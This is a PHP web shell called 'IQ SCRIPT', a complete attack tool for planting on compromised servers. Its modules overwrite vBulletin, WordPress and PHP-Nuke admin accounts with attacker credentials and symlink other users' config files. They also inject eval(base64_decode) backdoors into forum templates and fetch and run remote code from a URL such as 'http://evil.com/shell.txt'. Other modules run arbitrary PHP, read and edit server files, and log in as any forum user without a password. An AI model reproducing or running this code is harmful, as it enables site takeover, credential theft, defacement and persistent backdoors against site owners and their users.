<?
$uselogin = 1;
$user = 'admin';
$pass = 'iq';
$script = '<script>
<!--
var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
function encode64(input) {
   var output = "";
   var chr1, chr2, chr3;
   var enc1, enc2, enc3, enc4;
   var i = 0;

   do {
      chr1 = input.charCodeAt(i++);
      chr2 = input.charCodeAt(i++);
      chr3 = input.charCodeAt(i++);
      enc1 = chr1 >> 2;
      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
      enc4 = chr3 & 63;

      if (isNaN(chr2)) {
         enc3 = enc4 = 64;
      } else if (isNaN(chr3)) {enc4 = 64;}
      output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) + 
         keyStr.charAt(enc3) + keyStr.charAt(enc4);
   } while (i < input.length);
   
   return output;
}
//-->
</script>';
if ($uselogin ==1){
if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass)){
if($_POST[usrname]==$user and $_POST[passwrd]==$pass){
	print'<script>document.cookie="user='.$_POST[usrname].';";document.cookie="pass='.md5($_POST[passwrd]).';";alert("YoU Have Been Logged Succefully")</script>';
}else{
	if($_POST[usrname]){print'<script>alert("Wrong User Or Pass\nTry again or play away\n      X~~~~~~X")</script>';}
echo'
<body bgcolor=#000000>
<title>IQ SCRIPT</title>
<p align="center"><b><font face=pristina color="#008000" size="4">IQ SCRIPT<br>~ LOGIN ~</font></b></p>
<div align="center">
<form name="fr" action="" method="POST" onsubmit="if(this.usrname.value==\'\'){return false;}"><font face="Andalus"color="#008000" size="4">UserName:</font><br>
<input name="usrname" type="text" value="UserName"  size="30" onfocus="if (this.value == \'UserName\'){this.value = \'\';}"/><br><font face="Andalus"color="#008000" size="4">PassWord:</font><br> <input name="passwrd" type="password" value="PassWord" size="30" onfocus="if (this.value == \'PassWord\') this.value = \'\';" /><br><font face=pristina color="#008000" size="4">
<input type="submit" value="  Login  " />
</form></p>';
exit;
}
}
}
$form = '<div align="center">
<form action="" method="POST" >
<input name="lo" type="text" value="Localhost" align="LEFT" size="20" /> <input name="db" type="text" value="Database" align="LEFT" size="20" onfocus="if (this.value == \'Database\') this.value = \'\';"/><br><font face=pristina color="#008000" size="4">:: |~ K ~| ::</font><Br><input name="user" type="text" value="Username" align="LEFT" size="12" onfocus="if (this.value == \'Username\') this.value = \'\';"/><input name="pass" type="text" value="PassWord" align="MIDDLE" size="13" onfocus="if (this.value == \'PassWord\') this.value = \'\';"/><input name="tab" type="text" value="TablePrefix" align="LEFT" size="12" onfocus="if (this.value == \'TablePrefix\') this.value = \'\';"/><br>
<input type="submit" value="  submit  " />
</form></p>';
$fc = '<p align="center"><b><font face=pristina color="#008000" size="4">:: GreaTs ::</font></b></p>
<p align="center"><font face=pristina color="#008000" size="4">ALI-X ,El3akrab Elmodamer</font></p>
<p align="center"><b><font face=pristina color="#008000" size="4">:: |~ K ~| ::</font></b></p>
';
$x ='<body bgcolor=#000000>
<title>IQ SCRIPT</title>
<p align="center"><b><font face=pristina color="#008000" size="4">IQ SCRIPT<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
<font  face=pristina color="#008000" size="4">ADMIN\'S INFORMATIONS HAVE BEEN CHANGED<br> SUCCEFULLY !!<br>USERNAME : admin<br>PASSWORD : iraq </font>
<p align="center">
';
if ($_GET[a] == "vba"){
	if ($_POST['db'] == ''){
echo '<title>vbadmin</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">vbadmin<br>~ Karar alShaMi ~</font></b></p>
<p align="center">';
print $form;
print $f;	
}
if ($_POST['db'] != '')
{
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$z ="UPDATE `".$_POST['tab']."user` SET `username` = 'Karar alShaMi',
`password` = '9ce4d31a52f0a5c50d0b5652581c37fa',
`salt` = '{tg',`usergroupid` = '6' WHERE `".$_POST['tab']."user`.`userid` =1 LIMIT 1 ;";
$ka=@mysql_query($z) or die(mysql_error());
if ($ka){
print '<body bgcolor=#000000>
<title>IQ SCRIPT</title>
<p align="center"><b><font face=pristina color="#008000" size="4">IQ SCRIPT<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
<font  face=pristina color="#008000" size="4">ADMIN\'S INFORMATIONS HAVE BEEN CHANGED<br> SUCCEFULLY !!<br>USERNAME : Karar alShaMi<br>PASSWORD : iraq </font>
<p align="center">';
}
}
exit;
}
if ($_GET[a]=="wp"){
	if ($_POST['db'] == ''){
print '
<title>wpadmin</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">wpadmin<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
';
print $form;
print $f;	
}
if ($_POST['db'] != '')
{
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$z ="UPDATE `".$_POST['tab']."users` SET `user_login` = 'Karar alShaMi',
`user_pass` = '\$P\$B8hVXHMs071b.ZLWaIQ18qOKcoskst0',
`user_email` = 'No@No.com',
`display_name` = 'Karar alShaMi' WHERE `".$_POST['tab']."users`.`ID` =1 LIMIT 1 ;";
$ka=@mysql_query($z) or die(mysql_error());
if ($ka){
print '
<body bgcolor=#000000>
<title>wpadmin</title>
<p align="center"><b><font face=pristina color="#008000" size="4">wpadmin<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
<font  face=pristina color="#008000" size="4">ADMIN\'S INFORMATIONS HAVE BEEN CHANGED<br> SUCCEFULLY !!<br>USERNAME : Karar alShaMi<br>PASSWORD : iraq </font>
<p align="center">
';
}
}
exit;
}
if ($_GET[a]=="sym"){
     print"<title>SYMLINK</title>";
	if ($_POST['o'] != "ok"){
	print'<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">SYMLINK<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
<div align="center">
<form action="" method="POST"  >
<input name="usr" type="text" value="/home/victim_user/public_html/vb/includes/config.php" align="LEFT" size="50" /> <br><input name="my" type="text" value="'.@getcwd().'/file.txt" align="LEFT" size="50" /><Br>
<input type="hidden" name="o" value="ok">
<input type="submit" value="    Submit    " />
</form></p>
';
print $f;
}
else{
$sym = @symlink("$_POST[usr]","$_POST[my]");
	print '
	<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">SYMLINK<br>~ Karar alShaMi ~</font></b></p>
<p align="center">
<p align="center"><b><font face="Pristina" size="4" color="#008000">';
if ($sym){
 print
'Done !!</p>
';}
else{print'Error<br>Cannot Be completed';}
print $f;
}
exit;
}
if ($_GET[a]=="nuke"){
	if ($_POST['db'] == ''){
print '
<title>Nuke-admin</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">Nuke-admin<br>~ Karar alShaMi ~</font></b></p>
<p align="center">';
print $form;
print $f;	
}
if ($_POST['db'] != '')
{
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$z ="UPDATE `".$_POST['tab']."_authors` SET `aid` = 'admin' ,`email` = 'No@No.com',`pwd` = 'd3b1cee2327cfa357dabf0289958c024'  LIMIT 1 ;";
$ka=@mysql_query($z) or die(mysql_error());
if ($ka){
print $x;
}
}
exit;
}
if ($_GET[a]=="indv"){
	#header
print'<title>Vb index Changer</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">Vb index Changer<br>~ Karar alShaMi ~</font></b></p>
<p align="center"><font face=pristina color="#008000" size="4">';
$farm = '<div align="center">
<form name="frm" action="" method="POST" >
<input name="lo" type="text" value="Localhost" align="LEFT" size="18" /> <input name="db" type="text" value="Database" align="LEFT" size="18" onfocus="if (this.value == \'Database\') this.value = \'\';"/><Br><input name="user" type="text" value="Username" align="LEFT" size="15" onfocus="if (this.value == \'Username\') this.value = \'\';"/><input name="pass" type="text" value="Password" align="MIDDLE" size="15" onfocus="if (this.value == \'Password\') this.value = \'\';"/><input name="tab" type="text" value="TablePrefix" align="LEFT" size="15" onfocus="if (this.value == \'TablePrefix\') this.value = \'\';"/><br>
<textarea name="code" cols="41" rows="15" wrap="VIRTUAL" onfocus="if (this.value == \'YOUR InDeX\') this.value = \'\';">YOUR InDeX</textarea><br>
<input type="submit" value="    Change    " />
';
$fotind = '<font  face=pristina color="#008000" size="4">ChanGed Succefully !!</font>';
if ($_GET[ty]=="fhome" and $_POST[user] ==""){
 	print $farm;
	print $f;
	exit;}
	elseif($_GET[ty]=="fhome" and $_POST[user] !="") {
	@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
    @mysql_select_db($_POST['db']) or die(mysql_error());
$inde =str_replace('\\','\\\\',$_POST[code]);
    $n ='UPDATE `'.$_POST[tab].'template` SET `template` = \''.$inde.'\'WHERE `title` =\'FORUMHOME\';';
    $ka=@mysql_query($n) or die(mysql_error());
	if ($ka){
	print $fotind;
	}
	exit;
}
if ($_GET[ty]=="css" && $_POST[user] ==""){
 	print $farm;
	print $f;
	exit;}
	elseif($_GET[ty]=="css" and $_POST[user] !=""){
	@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
    @mysql_select_db($_POST['db']) or die(mysql_error());
    $n = 'UPDATE `'.$_POST[tab].'style` SET `css` = \''.$_POST[code].'\', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
    $ka=@mysql_query($n) or die(mysql_error());
if ($ka){
print $fotind;
}
exit;
}
if ($_GET[ty]=="spa" && $_POST[user] ==""){
 	print $farm;
	print $f;
	exit;}
	elseif($_GET[ty]=="spa" and $_POST[user] !=""){
	@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
    @mysql_select_db($_POST['db']) or die(mysql_error());
$set_index  = "{\${eval(base64_decode(\'";
$index=str_replace("\'","'",$_POST[code]);
$set_index .= base64_encode("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}</textarea>";
$ka=@mysql_query("UPDATE ".$_POST[tab]."template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());
if ($ka){
print $fotind;
}
exit;
}if ($_GET[ty]=="hea" && $_POST[user] ==""){
	print "<script>x=1</script>".$script.$farm;	
	print $f;
	exit;}
	elseif($_GET[ty]=="hea" and $_POST[user] !=""){
	@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
    @mysql_select_db($_POST['db']) or die(mysql_error());
$set_index  = "{\${eval(base64_decode(\'";
$index=str_replace("\'","'",$_POST[code]);
$set_index .= base64_encode("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}</textarea>";
$ka=@mysql_query("UPDATE ".$_POST[tab]."template SET template ='".$set_index."' WHERE title ='header'") or die(mysql_error());
if ($ka){
print $fotind;
}
exit;
}

print '<p align="center"><a href="?a=indv&ty=fhome"><font face=pristina size="4" color="#008000">FORUMHOME</p></font></p></a>
<p align="center"><a href="?a=indv&ty=spa"><font face=pristina size="4" color="#008000">SPACER_OPEN</p></font></p></a>
<p align="center"><a href="?a=indv&ty=css"><font face=pristina size="4" color="#008000">CSS</p></font></p></a>
<p align="center"><a href="?a=indv&ty=hea"><font face=pristina size="4" color="#008000">Header</p></font></p></a>
';
exit;
}
if ($_GET[a]== 'incl'){
	if (empty($_GET['fq'])){
	 echo '<title>includer</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">InCluder<br>~ Karar alShaMi ~</font></b></p>
<p align="center">';
print'
<div align="center">
<form action="" method="GET">
<input name="fq" type="text" value="http://" align="LEFT" size="30" /> <br>
<input type="hidden" name="a" value="incl">
<u><font size="2" color="#008000">Ex: http://evil.com/shell.txt</font></u><br>
<input type="submit" value="    Submit    " />
</form>
';
print $f;
	
	}else{
$file=implode("\n",file($_GET[fq]));
$kr=str_replace("<?php", "",$file); 
$kr=str_replace("<?", "",$kr); 
$kr=str_replace("?>", "",$kr);
eval($kr); 
	}
exit;
}
if ($_GET[a]=='kil'){
 echo '<title>Vb Killer</title>
<body bgcolor=#000000>
<p align="center"><b><font face=pristina color="#008000" size="4">Vb Killer<br>~ Karar alShaMi ~</b></p>
<p align="center">';
if (empty($_POST[db])){
print $script.'
<form name="frm" action="" method="POST" onsubmit="document.frm.code.value = encode64(document.frm.code.value)">
<div align="center">
<select size="1" name="template">
<option value="FAQ">FAQ</option>
<option value="FORUMHOME">FORUMHOME</option>
<option value="search_forums">search_forums</option>
<option value="SHOWGROUPS">SHOWGROUPS</option>
<option value="SHOWTHREAD">SHOWTHREAD</option>
<option value="CALENDAR">CALENDAR</option>
<option value="MEMBERINFO">MEMBERINFO</option>
<option value="footer">footer</option>
<option value="header">header</option>
<option value="headinclude">headinclude</option>
<option value="lostpw">lostpw</option>
<option value="memberlist">memberlist</option></select></p>
<input name="lo" type="text" value="Localhost" align="LEFT" size="18"/> <input name="db" type="text" value="Database" align="LEFT" size="18" onfocus="if (this.value == \'Database\') this.value = \'\';"/><Br><input name="user" type="text" value="Username" align="LEFT" size="15" onfocus="if (this.value == \'Username\') this.value = \'\';"/><input name="pass" type="text" value="PassWord" align="MIDDLE" size="15" onfocus="if (this.value == \'PassWord\') this.value = \'\';"/><input name="tab" type="text" value="TablePrefix" align="LEFT" size="15" onfocus="if (this.value == \'TablePrefix\') this.value = \'\';"/><br>
<textarea name="code" cols="41" rows="15" wrap="VIRTUAL" onfocus="if (this.value == \'Shell CodEs\') this.value = \'\';">Shell CodEs</textarea><br>
<input type="submit" value="    Change    "/>';
}else{
$a ="{\${eval(base64_decode(\'";
$template = $_POST['template'];
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$p = "UPDATE ".$_POST[tab]."template SET template ='".$a.$_POST[code]."\'))}}{\${exit()}}&' WHERE title ='".$template."'";
$ka= @mysql_query($p) or die(mysql_error());
if ($ka){print'Done !!';}
}
print $f;
exit;
}
if ($_GET[a]=='ins'){
  print $script.'<body bgcolor=#000000>
<title>VB CoDeSINseRter</title>
<p align="center"><b><font face=pristina color="#008000" size="4">VB CoDeSINseRter<br>~ Karar alShaMi ~</b></p>
<p align="center">';
if (!$_POST[code]){
print '<div align="center">
<form name="frm" action="" method="POST" onsubmit="document.frm.code.value = vb(document.frm.code.value)">
<select size="1" name="t">
<option value="spacer_open">SPACER_OPEN</option>
<option value="spacer_close">SPACER_CLOSE</option>
</select></p>
<input name="lo" type="text" value="Localhost" align="LEFT" size="18"/> <input name="db" type="text" value="Database" align="LEFT" size="18" onfocus="if (this.value == \'Database\') this.value = \'\';"/><Br><input name="user" type="text" value="Username" align="LEFT" size="15" onfocus="if (this.value == \'Username\') this.value = \'\';"/><input name="pass" type="text" value="PassWord" align="MIDDLE" size="15" onfocus="if (this.value == \'PassWord\') this.value = \'\';"/><input name="tab" type="text" value="TablePrefix" align="LEFT" size="15" onfocus="if (this.value == \'TablePrefix\') this.value = \'\';"/><br>
<textarea name="code" cols="41" rows="15" wrap="VIRTUAL" onfocus="if (this.value == \'HTML CODES\') this.value = \'\';">HTML CODES</textarea><br>
<input type="submit" value="    INSERT    " />';
}else{
 $lost = $_POST[t];
 $a ="{\${eval(base64_decode(\'";
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$p = "UPDATE ".$_POST[tab]."template SET template ='".$a.$_POST[code]."\'))}}' WHERE title ='".$lost."'";
$ka= @mysql_query($p) or die(mysql_error());
if ($ka){print"Done !!";}
}
print $f;
exit;
}
if ($_GET[a]=="conf"){
 print'<body bgcolor=#000000>
<title>ConFig Reader</title>
<p align="center"><b><font face=pristina color="#008000" size="4">ConFig Reader<br>~ Karar alShaMi ~</b></p>
<p align="center">';
	if($_POST[incle] != ""){
	 $file = @fopen($_POST[incle],r);
    $data=@fread($file,1546768);
    $data2 =str_replace("<","&lt;",$data);
		print '<div align="center"><textarea cols="70" rows="30">'.$data2.'</textarea>';
		exit;
	}else{
print'<div align="center">
<form action="" method="POST">
<font size="4" color="#008000">:: path ::</font><br>
<input name="incle" type="text" value="'.@getcwd().'" align="LEFT" size="45" /> <br>
<input type="submit" value="    Submit    " />';
exit;
	}
}
if ($_GET[a]=="fl"){
 print'<body bgcolor=#000000>
<title>Edit File</title>
<p align="center"><b><font face=pristina color="#008000" size="4">Edit File<br>~ Karar alShaMi ~</b></p>
<p align="center">';
if($_POST[incl] != ""){
$file = @fopen($_POST[incl],r);
$data=@fread($file,1546768);
$msr = str_replace("\\\\","\\",$_POST[incl]);
print '<form action="" method="POST"><div align="center"><font size="4" color="#008000">:: path ::</font><br>
<div align="center"><input name="incl" type="text" value="'.$msr.'" align="LEFT" size="45" /> <br><input type="submit" value="    Submit    " /></form>
<form action="" method="POST"><div align="center"><input name="incle" type="hidden" value="'.$msr.'" align="LEFT" size="45" /><textarea name=\'kr\' cols="70" rows="30">'.htmlspecialchars($data).'</textarea><br><input type="submit" value="    Save    " />';
exit;
	}
if($_POST[kr]){
$fl = str_replace("\'","'",$_POST[kr]);
$fl = str_replace('\"','"',$fl);
$fl = str_replace('\\\\','\\',$fl);
$d = @fopen($_POST[incle], 'w'); 
@fwrite($d,$fl);
@fclose($d);
if($d){
	print'<font size="4" color="#008000">Saved !!</font><br>';
exit;}else{print'<font size="4" color="#008000">Cann\'t Save !!</font><br>';
exit;}}
print'<div align="center">
<form action="" method="POST">
<font size="4" color="#008000">:: path ::</font><br>
<input name="incl" type="text" value="'.@getcwd().'" align="LEFT" size="45" /> <br>
<input type="submit" value="    Submit    " />';
exit;
	}

if($_GET[a]=="out"){
	print'
	<script>document.cookie="user=;";document.cookie="pass=;"; alert("YoU Have Been Logged out Succefully");window.location="?";</script>';
	exit;
}
if ($_GET[a]=="ev"){
	if(empty($_POST['php'])){
		print $script.'<body bgcolor=#000000>
<title>EVAL PHP</title>
<p align="center"><b><font face=pristina color="#008000" size="4">EVAL PHP<br>~ Karar alShaMi ~</b></p>
<p align="center">
<div align="center">
<form name="frm" action="" method="POST" onsubmit="document.frm.php.value = encode64(document.frm.php.value)">
<textarea name="php" cols="41" rows="15" wrap="VIRTUAL" onfocus="if (this.value == \'PHP\') this.value = \'\';">PHP</textarea><br>
<input type="submit" value="  EVAL " />';
	}else{
	eval(base64_decode($_POST[php]));
	}
exit;
}
if ($_GET[a]=="dr"){
 if(empty($_POST[user]) and empty($_POST[uid])){
print'<body bgcolor=#000000>
<title>Vb backdoor</title>
<p align="center"><b><font face=pristina color="#008000" size="4">Vb backdoor<br>~ Karar alShaMi ~</b></p>
<p align="center">	<div align="center">
<form action="" method="POST">
<font size="4" color="#008000">:: User ::</font><br>
<input name="user" type="text" value="UserName" align="center" size="45" onfocus="if (this.value ==\'UserName\')this.value = \'\';"/> <input name="ok" type="hidden" value="user" align="center" ><br>
<input type="submit" value="    Submit    " /><br><div align="center">
</form>
<form name="a" action="" method="POST">
<font size="4" color="#008000">:: Userid ::</font><br>
<input name="uid" type="text" value="User ID" align="center" size="45" onfocus="if (this.value ==\'User ID\')this.value = \'\';"/> <br>
<input type="submit" value="    Submit    " />';
exit;
}else{
define('THIS_SCRIPT', 'login');
require_once('./global.php');
require_once('./includes/functions_login.php');
if ($_POST[ok] == "user"){
$vbulletin->userinfo = $vbulletin->db->query_first("SELECT userid,usergroupid, membergroupids, infractiongroupids, username, password, salt FROM " . TABLE_PREFIX . "user WHERE username = '" . $_POST[user] . "'");
}else{
$vbulletin->userinfo = $vbulletin->db->query_first("SELECT userid,usergroupid, membergroupids, infractiongroupids, username, password, salt FROM " . TABLE_PREFIX . "user WHERE userid = '".$_POST[uid]."'");
}
if (!$vbulletin->userinfo['userid']) die("Invalid informations!");
else
{
vbsetcookie('userid', $vbulletin->userinfo['userid'], true, true, true);
vbsetcookie('password', md5($vbulletin->userinfo['password'] . COOKIE_SALT), true, true, true);
exec_unstrike_user($_POST[user]);
process_new_login('cplogin', TRUE, TRUE);
do_login_redirect();
}
}
}
print'
<title>IQ SCRIPT</title>
<body bgcolor="#000000">
<p align="center"><b><font face=pristina color="#008000" size="4">IQ SCRIPT<br>~ Karar alShaMi ~</font></b></p>
<p align="center"><a href="?a=vba"><font face=pristina size="4" color="#008000">Vb admin</p></font></p></a>
<p align="center"><a href="?a=nuke"><font face=pristina size="4" color="#008000">Nuke admin</p></font></p></a>
<p align="center"><a href="?a=wp"><font face=pristina size="4" color="#008000">WP admin</p></font></p></a>
<p align="center"><a href="?a=sym"><font face=pristina size="4" color="#008000">SYMLINK</p></font></p></a>
<p align="center"><a href="?a=indv"><font face=pristina size="4" color="#008000">Vb index Changer</p></font></p></a>
<p align="center"><a href="?a=incl"><font face=pristina size="4" color="#008000">InCluder</p></font></p></a>
<p align="center"><a href="?a=kil"><font face=pristina size="4" color="#008000">Vb Killer</p></font></p></a>
<p align="center"><a href="?a=ins"><font face=pristina size="4" color="#008000">VB CoDeSINseRter</p></font></p></a>
<p align="center"><a href="?a=conf"><font face=pristina size="4" color="#008000">ConFig Reader</p></font></p></a>
<p align="center"><a href="?a=ev"><font face=pristina size="4" color="#008000">EVAL PHP</p></font></p></a>
<p align="center"><a href="?a=fl"><font face=pristina size="4" color="#008000">Edit File</p></font></p></a>
<p align="center"><a href="?a=dr"><font face=pristina size="4" color="#008000">Vb Backdoor</p></font></p></a>
<p align="center"><a href="?a=out"><font face=pristina size="4" color="#008000">logout</p></font></p></a>
';
?>